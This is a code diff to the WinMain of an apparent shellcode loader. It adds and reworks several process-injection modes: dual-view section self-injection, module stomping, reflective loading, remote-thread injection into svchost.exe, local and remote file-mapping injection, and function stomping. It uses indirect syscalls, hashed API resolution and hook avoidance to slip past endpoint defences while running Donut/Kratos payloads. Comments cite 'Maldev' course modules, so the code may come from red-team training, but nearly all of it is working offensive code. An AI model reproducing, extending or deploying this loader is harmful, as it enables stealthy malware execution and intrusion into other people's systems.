+        if (!NT_SUCCESS(stCS) || !hSection) {
+            DBG("[SI] NtCreateSection failed");
             { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
             return 1;
         }
-        /* sc already decrypted and RW in current process - change to RX */
-        DBG_HEX("[SI2] shellcode addr", (unsigned long long)(ULONG_PTR)sc);
-        DBG_VAL("[SI2] shellcode size", (unsigned long long)sc_sz);
-        PVOID  prot_base = sc;
-        SIZE_T prot_sz   = sc_sz;
-        ULONG  old_prot  = 0;
-        NTSTATUS stP = pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
-        DBG_HEX("[SI3] NtProtectVirtualMemory status", (unsigned long long)(ULONG)stP);
-        /* Create thread suspended in current process (start addr is irrelevant) */
-        HANDLE hThread = NULL;
-        NTSTATUS st = pNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
-                             (PVOID)sc, NULL,
-                             0x1, /* CREATE_SUSPENDED */
-                             0, 0, 0, NULL);
-        DBG_HEX("[SI4] NtCreateThreadEx (suspended) status", (unsigned long long)(ULONG)st);
-        DBG_HEX("[SI4] hThread", (unsigned long long)(ULONG_PTR)hThread);
-        if (!hThread) {
-            DBG("[FAIL] SelfInject: thread creation failed");
+        PVOID rw_view = NULL;
+        SIZE_T view_sz = 0;
+        hg_NtMapViewOfSection(hSection, (HANDLE)-1, &rw_view, 0, 0, NULL, &view_sz, 2, 0, PAGE_READWRITE);
+        PVOID rx_view = NULL;
+        view_sz = 0;
+        hg_NtMapViewOfSection(hSection, (HANDLE)-1, &rx_view, 0, 0, NULL, &view_sz, 2, 0, PAGE_EXECUTE_READWRITE);
+        if (!rw_view || !rx_view) {
+            DBG("[SI] NtMapViewOfSection failed");
+            if (rw_view) hg_NtUnmapViewOfSection((HANDLE)-1, rw_view);
+            if (rx_view) hg_NtUnmapViewOfSection((HANDLE)-1, rx_view);
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
             return 1;
         }
-        /* Queue APC pointing to shellcode on the suspended thread */
-        NTSTATUS stA = pNtQAT(hThread, (PVOID)sc, NULL, NULL, NULL);
-        DBG_HEX("[SI5] NtQueueApcThread status", (unsigned long long)(ULONG)stA);
-        /* Resume thread - APC will fire */
-        pNtRT(hThread, NULL);
-        DBG("[SI6] Thread resumed - APC should fire");
-        /* Wait for shellcode to run */
-        if (pNtWSO) {
-            NTSTATUS stW = pNtWSO(hThread, FALSE, NULL);
-            DBG_HEX("[SI7] NtWaitForSingleObject returned", (unsigned long long)(ULONG)stW);
+        memcpy(rw_view, sc, sc_sz);
+        hg_NtUnmapViewOfSection((HANDLE)-1, rw_view);
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        DBG("[SI1] Dual-view section: shellcode in RX view, no NtProtect needed");
+
+        HANDLE hSIThread = NULL;
+        NTSTATUS stSI = hg_NtCreateThreadEx(&hSIThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, rx_view, NULL, 0, 0, 0, 0, NULL);
+        DBG_HEX("[SI2] NtCreateThreadEx status", (unsigned long long)(ULONG)stSI);
+        if (hSIThread) {
+            LARGE_INTEGER si_to = {0};
+            si_to.QuadPart = -50000000LL; /* 5 seconds */
+            NTSTATUS stW = pNtWSO(hSIThread, FALSE, &si_to);
+            if ((ULONG)stW == 0x00000102UL) {
+                DBG("[SI3] Thread alive after 5s - Donut/Kratos running in-process, waiting 30s more...");
+                LARGE_INTEGER si_to2 = {0};
+                si_to2.QuadPart = -300000000LL; /* 30 seconds */
+                pNtWSO(hSIThread, FALSE, &si_to2);
+                DBG("[SI4] 35s total wait complete");
+            } else {
+                DBG_HEX("[SI3] Thread exited early (Donut crash or WinMain returned)", (unsigned long long)(ULONG)stW);
+            }
+            if (pCH) pCH(hSIThread);
         }
-        if (pCH) pCH(hThread);
     }
 #elif defined(USE_FIBER_INJECT)
     /* Fiber injection: shellcode via fiber switch (no thread creation) */
@@ -645,34 +972,57 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
             return 1;
         }
-        /* sc already decrypted and RW - change to RX via VirtualProtect (kernel32, signed caller) */
+        /* sc already decrypted and RW - change to RX via NtProtectVirtualMemory (avoids VirtualProtect hook) */
         DBG_HEX("[FI2] shellcode addr", (unsigned long long)(ULONG_PTR)sc);
         DBG_VAL("[FI2] shellcode size", (unsigned long long)sc_sz);
         {
-            typedef BOOL (WINAPI *t_VP2)(LPVOID, SIZE_T, DWORD, PDWORD);
-            t_VP2 pVP2 = (t_VP2)RK32(HF_VirtualProtect);
-            DWORD old_fi = 0;
-            if (pVP2) pVP2((LPVOID)sc, payload_size, PAGE_EXECUTE_READ, &old_fi);
+            PVOID base = (PVOID)sc;
+            SIZE_T sz = (SIZE_T)sc_sz;
+            ULONG old_fi = 0;
+            pNtPVM((HANDLE)-1, &base, &sz, PAGE_EXECUTE_READ, &old_fi);
         }
-        DBG("[FI3] Self RW -> RX via VirtualProtect done");
+        DBG("[FI3] Self RW -> RX via NtProtectVirtualMemory done");
         LPVOID mainFiber = pCTTF(NULL);
         if (!mainFiber) {
             DBG("[FAIL] FiberInject: ConvertThreadToFiber failed (GetLastError may help)");
             return 1;
         }
         DBG_HEX("[FI4] mainFiber handle", (unsigned long long)(ULONG_PTR)mainFiber);
-        LPVOID scFiber = pCF(0x100000, (LPFIBER_START_ROUTINE)sc, NULL);
+        LPVOID scFiber = pCF(0x800000, (LPFIBER_START_ROUTINE)sc, NULL);
         if (!scFiber) {
             DBG("[FAIL] FiberInject: CreateFiber failed");
             return 1;
         }
         DBG_HEX("[FI5] scFiber handle", (unsigned long long)(ULONG_PTR)scFiber);
-        DBG_VAL("[FI5] fiber stack size", (unsigned long long)0x100000);
-        DBG("[FI6] SwitchToFiber - shellcode should now execute...");
-        pSTF(scFiber);
-        DBG("[FI7] Returned from shellcode fiber (shellcode exited or switched back)");
-        if (pDF) pDF(scFiber);
-        DBG("[FI8] Fiber deleted - injection complete");
+        /* Run shellcode via NtCreateThreadEx for lifecycle diagnostics */
+        typedef NTSTATUS (NTAPI *t_NtCTE_FI)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        typedef NTSTATUS (NTAPI *t_NtWSO_FI)(HANDLE,BOOLEAN,PLARGE_INTEGER);
+        t_NtCTE_FI pNtCTE_FI = (t_NtCTE_FI)resolve(hNtdll, HF_NtCreateThreadEx);
+        t_NtWSO_FI pNtWSO_FI = (t_NtWSO_FI)resolve(hNtdll, HF_NtWaitForSingleObject);
+        HANDLE hFIThread = NULL;
+        if (pNtCTE_FI) {
+            NTSTATUS stFI = pNtCTE_FI(&hFIThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, sc, NULL, 0, 0, 0, 0, NULL);
+            DBG_HEX("[FI6] NtCreateThreadEx status", (unsigned long long)(ULONG)stFI);
+        }
+        if (hFIThread && pNtWSO_FI) {
+            LARGE_INTEGER fi_to = {0};
+            fi_to.QuadPart = -50000000LL;
+            NTSTATUS stW = pNtWSO_FI(hFIThread, FALSE, &fi_to);
+            if ((ULONG)stW == 0x00000102UL) {
+                DBG("[FI7] Thread alive 5s - Donut/Kratos running, waiting 30s more...");
+                LARGE_INTEGER fi_to2 = {0};
+                fi_to2.QuadPart = -300000000LL;
+                pNtWSO_FI(hFIThread, FALSE, &fi_to2);
+                DBG("[FI8] 35s total elapsed");
+            } else {
+                DBG_HEX("[FI7] Thread exited early (crash or ExitProcess)", (unsigned long long)(ULONG)stW);
+            }
+            if (pDF) pDF(scFiber);
+            if (pCTTF) {} /* fiber created but unused - shellcode ran via thread */
+            typedef BOOL (WINAPI *t_CH_FI)(HANDLE);
+            t_CH_FI pCH_FI = (t_CH_FI)RK32(HF_CloseHandle);
+            if (pCH_FI) pCH_FI(hFIThread);
+        }
     }
 #elif defined(USE_MODULE_STOMP)
     /* Module stomping: map sacrificial DLL via NtCreateSection+NtMapViewOfSection,
@@ -690,8 +1040,15 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         typedef BOOL     (WINAPI *t_VP2) (LPVOID, SIZE_T, DWORD, PDWORD);
         typedef BOOL     (WINAPI *t_CH)  (HANDLE);
 
+#ifdef USE_HELLSHALL
+        auto pNtCS = [](PHANDLE h, ACCESS_MASK a, POBJECT_ATTRIBUTES o, PLARGE_INTEGER ms, ULONG pp, ULONG sa, HANDLE hf) {
+            return hg_NtCreateSection(h, a, (PVOID)o, ms, pp, sa, hf); };
+        auto pNtMVS = [](HANDLE hs, HANDLE hp, PVOID *b, ULONG_PTR zb, SIZE_T c, PLARGE_INTEGER off, PSIZE_T vs, DWORD inh, ULONG at, ULONG p) {
+            return hg_NtMapViewOfSection(hs, hp, b, zb, c, off, vs, inh, at, p); };
+#else
         t_NtCS  pNtCS  = (t_NtCS)  resolve(hNtdll, HF_NtCreateSection);
         t_NtMVS pNtMVS = (t_NtMVS) resolve(hNtdll, HF_NtMapViewOfSection);
+#endif
         t_CTTF  pCTTF  = (t_CTTF)  RK32(HF_ConvertThreadToFiber);
         t_CF    pCF    = (t_CF)    RK32(HF_CreateFiber);
         t_STF   pSTF   = (t_STF)   RK32(HF_SwitchToFiber);
@@ -732,13 +1089,15 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         /* Map view into current process as RWX */
         PVOID pDll = NULL;
         SIZE_T viewSz = 0;
-        NTSTATUS stMVS = pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1 /*ViewShare*/, 0, PAGE_EXECUTE_WRITECOPY);
-        if (pCH) pCH(hSection);
+        /* Map as PAGE_EXECUTE_READ first (always succeeds for SEC_IMAGE .text section).
+           VirtualProtect will add write (COW) before writing the shellcode. */
+        NTSTATUS stMVS = pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1 /*ViewShare*/, 0, PAGE_EXECUTE_READ);
         if (!NT_SUCCESS(stMVS) || !pDll) {
-            /* Retry with PAGE_EXECUTE_READWRITE if WRITECOPY not supported */
+            /* Last resort: try WRITECOPY */
             pDll = NULL; viewSz = 0;
-            pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, PAGE_READWRITE);
+            pNtMVS(hSection, (HANDLE)-1, &pDll, 0, 0, NULL, &viewSz, 1, 0, PAGE_EXECUTE_WRITECOPY);
         }
+        if (pCH) pCH(hSection);  /* Close section handle after all mapping attempts */
         if (!pDll) { DBG("[FAIL] ModuleStomp: NtMapViewOfSection failed"); return 1; }
         DBG_HEX("[MS3] DLL mapped at", (unsigned long long)(ULONG_PTR)pDll);
         DBG_VAL("[MS3] view size", (unsigned long long)viewSz);
@@ -761,48 +1120,62 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             }
         }
         DBG_VAL("[MS5] .text size", (unsigned long long)text_sz);
-        DBG_VAL("[MS5] payload size", (unsigned long long)payload_size);
+        DBG_VAL("[MS5] payload size", (unsigned long long)sc_sz);
 
         /* If payload fits in .text starting from entry point, use entry point.
            Otherwise use beginning of .text section. */
         ULONG_PTR inject_addr = entryPt;
-        if (text_va && text_sz > payload_size) {
+        if (text_va && text_sz > sc_sz) {
             SIZE_T space_from_ep = text_sz - (entryPt - text_va);
-            if (space_from_ep < payload_size) {
+            if (space_from_ep < sc_sz) {
                 inject_addr = text_va;
                 DBG("[MS5] Using .text base (entry point too close to end)");
             }
-        } else if (text_va && text_sz > payload_size) {
+        } else if (text_va && text_sz > sc_sz) {
             inject_addr = text_va;
         }
         DBG_HEX("[MS6] Injection address", (unsigned long long)inject_addr);
 
-        /* RW the target region */
+        /* Force RWX on the target range for both writing and Donut self-modification.
+           Donut decrypts embedded modules in-place so the region must stay writable
+           at thread startup - do NOT switch back to RX. */
         DWORD old_ms = 0;
-        pVP2((LPVOID)inject_addr, payload_size, PAGE_READWRITE, &old_ms);
-
-        /* Write shellcode into DLL memory */
-        memcpy((void *)inject_addr, sc, payload_size);
-        DBG("[MS7] Shellcode written to DLL .text");
+        pVP2((PVOID)inject_addr, sc_sz, PAGE_EXECUTE_READWRITE, &old_ms);
+        DBG("[MS6a] VirtualProtect -> RWX");
+        memcpy((void *)inject_addr, sc, sc_sz);
+        DBG("[MS7] Shellcode written to DLL .text (stays RWX for Donut self-mod)");
 
 #ifdef USE_WIPE
-        memset(sc, 0, payload_size);
+        memset(sc, 0, sc_sz);
 #endif
         /* Free local decryption buffer via VirtualFree */
         { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(sc,0,MEM_RELEASE); }
 
-        /* Restore RX */
-        pVP2((LPVOID)inject_addr, payload_size, PAGE_EXECUTE_READ, &old_ms);
-        DBG("[MS8] .text section RX restored");
-
-        /* Execute via fiber: shellcode runs from DLL image-backed memory */
-        LPVOID mainFiber = pCTTF(NULL);
-        if (!mainFiber) { DBG("[FAIL] ModuleStomp: ConvertThreadToFiber failed"); return 1; }
-        LPVOID scFiber = pCF(0x100000, (LPFIBER_START_ROUTINE)inject_addr, NULL);
-        if (!scFiber) { DBG("[FAIL] ModuleStomp: CreateFiber failed"); return 1; }
-        DBG("[MS9] Switching to shellcode fiber in DLL memory...");
-        pSTF(scFiber);
-        DBG("[MS10] Returned from shellcode fiber");
+        /* Execute shellcode in DLL-backed memory via hellshall indirect syscall thread */
+        DBG("[MS9] Launching thread in stomped DLL memory...");
+        HANDLE hMSThread = NULL;
+#ifdef USE_HELLSHALL
+        NTSTATUS stMS = hg_NtCreateThreadEx(&hMSThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)inject_addr, NULL, 0, 0, 0, 0, NULL);
+#else
+        {
+        typedef NTSTATUS (NTAPI *t_NtCTE_MS)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        t_NtCTE_MS pNtCTE_MS = (t_NtCTE_MS)resolve(hNtdll, HF_NtCreateThreadEx);
+        NTSTATUS stMS = pNtCTE_MS ? pNtCTE_MS(&hMSThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)inject_addr, NULL, 0, 0, 0, 0, NULL) : (NTSTATUS)0xC0000001;
+        }
+#endif
+        DBG_HEX("[MS10] NtCreateThreadEx status", (unsigned long long)(ULONG)stMS);
+        if (hMSThread) {
+            DBG("[MS11] Waiting indefinitely for shellcode thread...");
+#ifdef USE_HELLSHALL
+            hg_NtWaitForSingleObject(hMSThread, FALSE, NULL);
+#else
+            { typedef NTSTATUS (NTAPI *t_W)(HANDLE,BOOLEAN,PLARGE_INTEGER); t_W pW=(t_W)resolve(hNtdll,HF_NtWaitForSingleObject); if(pW) pW(hMSThread,FALSE,NULL); }
+#endif
+            DBG("[MS12] Shellcode thread returned");
+            typedef BOOL (WINAPI *t_CH_MS)(HANDLE);
+            t_CH_MS pCH_MS = (t_CH_MS)RK32(HF_CloseHandle);
+            if (pCH_MS) pCH_MS(hMSThread);
+        }
     }
 #elif defined(USE_REFLECTIVE_LOAD)
     /* Reflective PE loader: maps Kratos PE via NtCreateSection+NtMapViewOfSection.
@@ -820,11 +1193,17 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         typedef NTSTATUS (NTAPI *t_NtCS2)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
         typedef NTSTATUS (NTAPI *t_NtMVS2)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);
         typedef BOOL     (WINAPI *t_CH2)(HANDLE);
+#ifdef USE_HELLSHALL
+        auto pNtCS2 = [](PHANDLE h, ACCESS_MASK a, PVOID o, PLARGE_INTEGER ms, ULONG pp, ULONG sa, HANDLE hf) {
+            return hg_NtCreateSection(h, a, o, ms, pp, sa, hf); };
+        auto pNtMVS2 = [](HANDLE hs, HANDLE hp, PVOID *b, ULONG_PTR zb, SIZE_T c, PLARGE_INTEGER off, PSIZE_T vs, ULONG inh, ULONG at, ULONG p) {
+            return hg_NtMapViewOfSection(hs, hp, b, zb, c, off, vs, (DWORD)inh, at, p); };
+#else
         t_NtCS2  pNtCS2  = (t_NtCS2)  resolve(hNtdll, HF_NtCreateSection);
         t_NtMVS2 pNtMVS2 = (t_NtMVS2) resolve(hNtdll, HF_NtMapViewOfSection);
-        t_CH2    pCH2    = (t_CH2)    RK32(HF_CloseHandle);
-
         if (!pNtCS2 || !pNtMVS2) { DBG("[FAIL] RL: Nt* not found"); return 1; }
+#endif
+        t_CH2    pCH2    = (t_CH2)    RK32(HF_CloseHandle);
 
         HANDLE rl_hSec = NULL;
         LARGE_INTEGER rl_sz = {0};
@@ -934,19 +1313,25 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
         typedef HANDLE (WINAPI *t_OP)(DWORD,BOOL,DWORD);
         typedef BOOL   (WINAPI *t_CH)(HANDLE);
+#ifdef USE_HELLSHALL
+        auto pNtCTE = [](PHANDLE h, ACCESS_MASK a, PVOID o, HANDLE p, PVOID s, PVOID ag, ULONG f, SIZE_T zb, SIZE_T ss, SIZE_T ms, PVOID al) {
+            return hg_NtCreateThreadEx(h, a, o, p, s, ag, f, zb, ss, ms, al); };
+#else
         t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+#endif
         t_OP    pOP    = (t_OP)  R(HMOD_KERNEL32, HF_OpenProcess);
         t_CH    pCH    = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
-        if (!pNtCTE || !pOP) {
+        if (!pOP) {
             DBG("[FAIL] RemoteThread: API resolution failed");
             { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
             return 1;
         }
-        wchar_t target[] = { %TARGET_PROCESS_W% };
-        DWORD tpid = find_process_pid(target);
-        DBG_VAL("[RT1] target PID", (unsigned long long)tpid);
+        /* Target svchost.exe: always running as SYSTEM in session 0, DLLs initialized */
+        static const wchar_t rt_target[] = {'s','v','c','h','o','s','t','.','e','x','e','\0'};
+        DWORD tpid = find_process_pid(rt_target);
+        DBG_VAL("[RT1] svchost.exe PID", (unsigned long long)tpid);
         if (!tpid) {
-            DBG("[FAIL] RemoteThread: target process not found");
+            DBG("[FAIL] RemoteThread: svchost.exe not found");
             { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
             return 1;
         }
@@ -958,7 +1343,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         }
         DBG("[RT2] OpenProcess OK");
         PVOID  remote   = NULL;
-        SIZE_T alloc_sz = payload_size;
+        SIZE_T alloc_sz = sc_sz;
         NTSTATUS st = pNtAVM(hProc, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!remote) {
             DBG_HEX("[FAIL] RemoteThread: NtAVM status", (unsigned long long)(ULONG)st);
@@ -967,13 +1352,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
             return 1;
         }
         DBG_HEX("[RT3] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
-        pNtWVM(hProc, remote, sc, payload_size, NULL);
+        pNtWVM(hProc, remote, sc, sc_sz, NULL);
 #ifdef USE_WIPE
-        memset(sc, 0, payload_size);
+        memset(sc, 0, sc_sz);
 #endif
         { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
         PVOID  prot_base = remote;
-        SIZE_T prot_sz   = payload_size;
+        SIZE_T prot_sz   = sc_sz;
         ULONG  old_prot  = 0;
         pNtPVM(hProc, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
         DBG("[RT4] RW -> RX");
@@ -982,6 +1367,255 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         DBG_HEX("[RT5] NtCreateThreadEx status", (unsigned long long)(ULONG)st);
         if (hThread) pCH(hThread);
         pCH(hProc);
+    }
+#elif defined(USE_LOCAL_MAP_INJECT)
+    /* Module 42: Local Mapping Injection - no VirtualAlloc/VirtualProtect */
+    {
+        DBG("[LM] === LOCAL MAPPING INJECTION (Maldev mod.42) ===");
+        typedef HANDLE   (WINAPI *t_CFM)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCWSTR);
+        typedef PVOID    (WINAPI *t_MVF)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
+        typedef BOOL     (WINAPI *t_UVF)(LPCVOID);
+        typedef BOOL     (WINAPI *t_CH) (HANDLE);
+        typedef NTSTATUS (NTAPI  *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        typedef NTSTATUS (NTAPI  *t_NtWSO)(HANDLE,BOOLEAN,PLARGE_INTEGER);
+        t_CFM   pCFM   = (t_CFM)  RK32(HF_CreateFileMappingW);
+        t_MVF   pMVF   = (t_MVF)  RK32(HF_MapViewOfFile);
+        t_UVF   pUVF   = (t_UVF)  RK32(HF_UnmapViewOfFile);
+        t_CH    pCH    = (t_CH)   RK32(HF_CloseHandle);
+        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+        t_NtWSO pNtWSO = (t_NtWSO)resolve(hNtdll, HF_NtWaitForSingleObject);
+        if (!pCFM || !pMVF) {
+            DBG("[FAIL] LocalMapInject: API resolution failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        HANDLE hMap = pCFM(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)sc_sz, NULL);
+        if (!hMap) {
+            DBG("[FAIL] LocalMapInject: CreateFileMappingW failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        DBG_HEX("[LM1] file mapping handle", (unsigned long long)(ULONG_PTR)hMap);
+        PVOID pMap = pMVF(hMap, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sc_sz);
+        if (!pMap) {
+            DBG("[FAIL] LocalMapInject: MapViewOfFile failed");
+            if (pCH) pCH(hMap);
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        DBG_HEX("[LM2] mapped address", (unsigned long long)(ULONG_PTR)pMap);
+        memcpy(pMap, sc, sc_sz);
+#ifdef USE_WIPE
+        memset(sc, 0, sc_sz);
+#endif
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        if (pCH) pCH(hMap);
+        DBG("[LM3] shellcode in mapped memory, launching thread");
+        HANDLE hThreadLM = NULL;
+        NTSTATUS stLM = pNtCTE(&hThreadLM, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pMap, NULL, 0, 0, 0, 0, NULL);
+        DBG_HEX("[LM4] NtCreateThreadEx status", (unsigned long long)(ULONG)stLM);
+        if (hThreadLM) {
+            if (pNtWSO) {
+                LARGE_INTEGER lm_to = {0};
+                lm_to.QuadPart = -50000000LL; /* 5 seconds */
+                NTSTATUS stW = pNtWSO(hThreadLM, FALSE, &lm_to);
+                if ((ULONG)stW == 0x00000102UL) {
+                    DBG("[LM5] Thread alive 5s - Donut/Kratos running, waiting 30s more...");
+                    LARGE_INTEGER lm_to2 = {0};
+                    lm_to2.QuadPart = -300000000LL; /* 30 seconds */
+                    pNtWSO(hThreadLM, FALSE, &lm_to2);
+                    DBG("[LM6] 35s total wait complete");
+                } else {
+                    DBG_HEX("[LM5] Thread exited early (Donut crash or WinMain returned)", (unsigned long long)(ULONG)stW);
+                }
+            }
+            if (pCH) pCH(hThreadLM);
+        }
+        if (pUVF) pUVF(pMap);
+    }
+#elif defined(USE_REMOTE_MAP_INJECT)
+    /* Module 43: Remote Mapping Injection via MapViewOfFile2 - no VirtualAllocEx/WriteProcessMemory */
+    {
+        DBG("[RM] === REMOTE MAPPING INJECTION (Maldev mod.43) ===");
+        typedef HANDLE   (WINAPI *t_CFM)(LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCWSTR);
+        typedef PVOID    (WINAPI *t_MVF)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
+        typedef PVOID    (WINAPI *t_MVF2)(HANDLE,HANDLE,ULONG64,PVOID,SIZE_T,ULONG,ULONG);
+        typedef BOOL     (WINAPI *t_UVF)(LPCVOID);
+        typedef BOOL     (WINAPI *t_CH) (HANDLE);
+        typedef HANDLE   (WINAPI *t_OP) (DWORD,BOOL,DWORD);
+        typedef NTSTATUS (NTAPI  *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        t_CFM   pCFM   = (t_CFM)  RK32(HF_CreateFileMappingW);
+        t_MVF   pMVF   = (t_MVF)  RK32(HF_MapViewOfFile);
+        t_MVF2  pMVF2  = (t_MVF2) R(HMOD_KERNELBASE, HF_MapViewOfFile2);
+        t_UVF   pUVF   = (t_UVF)  RK32(HF_UnmapViewOfFile);
+        t_CH    pCH    = (t_CH)   RK32(HF_CloseHandle);
+        t_OP    pOP    = (t_OP)   RK32(HF_OpenProcess);
+        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+        if (!pCFM || !pMVF || !pMVF2 || !pOP) {
+            DBG("[FAIL] RemoteMapInject: API resolution failed (MapViewOfFile2 requires Win10 1703+)");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        wchar_t rm_target[] = { %TARGET_PROCESS_W% };
+        DWORD rm_pid = find_process_pid(rm_target);
+        DBG_VAL("[RM1] target PID", (unsigned long long)rm_pid);
+        if (!rm_pid) {
+            DBG("[FAIL] RemoteMapInject: target process not found");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        HANDLE hRMProc = pOP(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, rm_pid);
+        if (!hRMProc) {
+            DBG("[FAIL] RemoteMapInject: OpenProcess failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        DBG("[RM2] OpenProcess OK");
+        HANDLE hMap = pCFM(NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)sc_sz, NULL);
+        if (!hMap) {
+            DBG("[FAIL] RemoteMapInject: CreateFileMappingW failed");
+            if (pCH) pCH(hRMProc);
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        PVOID pLocal = pMVF(hMap, FILE_MAP_WRITE, 0, 0, sc_sz);
+        if (!pLocal) {
+            DBG("[FAIL] RemoteMapInject: MapViewOfFile local failed");
+            if (pCH) { pCH(hMap); pCH(hRMProc); }
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        memcpy(pLocal, sc, sc_sz);
+#ifdef USE_WIPE
+        memset(sc, 0, sc_sz);
+#endif
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        DBG("[RM3] shellcode in local mapping, projecting to remote");
+        PVOID pRemote = pMVF2(hMap, hRMProc, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
+        if (pCH) pCH(hMap);
+        if (pUVF) pUVF(pLocal);
+        if (!pRemote) {
+            DBG("[FAIL] RemoteMapInject: MapViewOfFile2 failed");
+            if (pCH) pCH(hRMProc);
+            return 1;
+        }
+        DBG_HEX("[RM4] remote mapping address", (unsigned long long)(ULONG_PTR)pRemote);
+        HANDLE hThreadRM = NULL;
+        NTSTATUS stRM = pNtCTE(&hThreadRM, THREAD_ALL_ACCESS, NULL, hRMProc, pRemote, NULL, 0, 0, 0, 0, NULL);
+        DBG_HEX("[RM5] NtCreateThreadEx status", (unsigned long long)(ULONG)stRM);
+        if (hThreadRM && pCH) pCH(hThreadRM);
+        if (pCH) pCH(hRMProc);
+    }
+#elif defined(USE_FUNC_STOMP)
+    /* Module 45: Remote Function Stomping - no VirtualAllocEx, overwrites exported func in target */
+    {
+        DBG("[FS] === REMOTE FUNCTION STOMPING (Maldev mod.45) ===");
+        typedef HMODULE  (WINAPI *t_LLA)(LPCSTR);
